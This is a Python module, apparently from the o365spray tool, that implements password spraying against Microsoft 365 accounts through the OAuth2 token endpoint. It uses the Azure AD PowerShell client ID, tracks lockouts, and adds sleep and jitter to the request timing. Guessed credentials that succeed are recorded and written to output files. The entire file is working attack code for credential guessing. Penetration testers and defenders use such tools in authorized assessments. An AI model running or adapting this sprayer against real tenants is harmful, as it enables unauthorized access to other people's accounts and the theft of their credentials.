#!/usr/bin/env python3

import time
import logging
from o365spray.core.utils import (
    Defaults,
    text_colors,
)
from o365spray.core.handlers.sprayer.modules.base import SprayerBase


class SprayModule_oauth2(SprayerBase):
    """oAuth2 Sprayer module class"""

    def __init__(self, *args, **kwargs):
        """Initialize the parent base class"""
        super(SprayModule_oauth2, self).__init__(*args, **kwargs)

    def _spray(self, domain: str, user: str, password: str):
        """Spray users via Microsoft's oAuth2 endpoint

        Arguments:
            domain: domain to spray
            user: username for authentication
            password: password for authentication

        Raises:
            ValueError: if locked account limit reached
            Exception: generic handler so we can successfully fail without
              crashing the run
        """
        try:
            # Check if we hit our locked account limit, and stop
            if self.lockout >= self.locked_limit:
                raise ValueError("Locked account limit reached.")

            # Grab prebuilt office headers
            headers = Defaults.HTTP_HEADERS
            headers["Accept"] = "application/json"
            headers["Content-Type"] = "application/x-www-form-urlencoded"

            # Build email if not already built
            email = self.HELPER.check_email(user, domain)

            # Write the tested user
            tested = f"{email}:{password}"
            if self.writer:
                self.tested_writer.write(tested)

            time.sleep(0.250)

            # Resource and client_id must be valid for authentication
            # to complete
            # APP: Azure Active Directory PowerShell
            data = {
                "resource": "https://graph.windows.net",
                "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",
                "grant_type": "password",
                "username": email,
                "password": password,
                "scope": "openid",
            }

            url = "https://login.microsoftonline.com/common/oauth2/token"
            response = self._send_request(
                "post",
                url,
                data=data,
                headers=headers,
                proxies=self.proxies,
                timeout=self.timeout,
                sleep=self.sleep,
                jitter=self.jitter,
            )

            status = response.status_code
            if status == 200:
                if self.writer:
                    self.valid_writer.write(tested)
                self.VALID_CREDENTIALS.append(tested)
                logging.info(
                    f"[{text_colors.OKGREEN}VALID{text_colors.ENDC}] {email}:{password}"
                )
                # Remove valid user from being sprayed again
                self.userlist.remove(user)

            else:
                # Handle Microsoft AADSTS errors
                body = response.json()
                error = body["error_description"].split("\r\n")[0]
                self._check_aadsts(
                    user,
                    email,
                    password,
                    error,
                )

        except Exception as e:
            logging.debug(e)
            pass
